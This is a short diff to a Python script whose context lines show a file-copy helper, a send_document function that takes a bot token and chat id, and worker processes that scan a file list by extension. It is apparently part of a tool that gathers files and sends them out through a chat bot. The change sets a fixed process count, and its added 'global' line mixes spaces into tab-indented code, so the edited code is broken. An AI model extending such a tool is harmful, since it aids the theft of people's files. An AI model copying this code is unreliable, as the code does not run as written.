@@ -7,7 +7,7 @@ from multiprocessing import Pool,Process,Queue,Lock
 import multiprocessing
 import requests
 import config
-
+PROC_NUM=5
 def copyFile(src,dst):
     try:
         shutil.copy(src,dst)
@@ -70,6 +70,7 @@ def send_document(bot_token,chtid,docfile):
 
 def superProc(fileList,num,extlist,hostdir):
 	cnt=num
+    global PROC_NUM
 	print(f'Proc number {num} activated')
 	while True:
 		while len(fileList)>=num:
@@ -86,7 +87,7 @@ def superProc(fileList,num,extlist,hostdir):
 						print('[-]No connection')
 				if fileList[cnt]=='TERMINATED':
 					return
-				cnt+=num
+				cnt+=PROC_NUM
 			except:
 				pass
 
